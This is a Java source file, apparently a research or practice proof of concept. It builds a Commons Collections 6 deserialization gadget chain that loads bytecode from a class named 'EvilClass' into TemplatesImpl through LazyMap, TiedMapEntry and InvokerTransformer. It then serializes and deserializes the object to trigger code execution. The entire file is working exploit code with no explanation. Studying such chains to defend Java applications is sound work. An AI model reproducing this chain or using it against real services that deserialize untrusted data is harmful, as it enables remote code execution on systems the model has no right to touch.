import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Map;

public class TemplateHashMapCC6 {
    public static void main(String[] args) throws Exception{
        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("getClass", null, null);

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry entry = new TiedMapEntry(outerMap, templates);

        HashMap expMap = new HashMap();
        expMap.put(entry, null);

        innerMap.clear();

        Util.setValue(invokerTransformer, "iMethodName", "newTransformer");

        byte[] b = Util.toSerial(expMap);

        ObjectInputStream inputStream = Util.fromSerial(b);

        inputStream.readObject();
    }
}
